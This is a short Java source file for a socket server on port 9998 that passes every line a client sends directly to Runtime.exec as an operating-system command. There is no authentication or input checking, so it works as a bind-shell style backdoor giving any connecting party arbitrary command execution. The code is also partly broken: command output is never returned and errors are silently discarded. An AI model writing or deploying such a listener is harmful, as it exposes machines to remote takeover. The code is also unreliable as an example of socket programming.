import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;

public class Server {

	public static void main(String[] args) throws IOException 
	{
		run();
	}
	
	public static void run() throws IOException
	{
		try
		{
			    @SuppressWarnings("resource")
				ServerSocket serverSocket = new ServerSocket(9998);
			    System.out.println("Server socket created");
			    Socket clientSocket = serverSocket.accept();
			    PrintWriter output = new PrintWriter(clientSocket.getOutputStream(), true);
			    BufferedReader input = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
			    
			    String inputLine = null, outputLine = null;
	            while ((inputLine = input.readLine()) != null) 
	            {	
	            	Process p;
	                try {
	                    p = Runtime.getRuntime().exec(inputLine);
	                    BufferedReader br = new BufferedReader(
	                        new InputStreamReader(p.getInputStream()));
	                    p.waitFor();
	                    System.out.println ("exit: " + p.exitValue());
	                    p.destroy();
	                } catch (Exception e) {}
	                output.println(outputLine);
	            }
		}
		catch (IOException e) 
		{
            System.out.println("Exception caught when trying to listen on port or listening for a connection");
            System.out.println(e.getMessage());
        }
	}
}
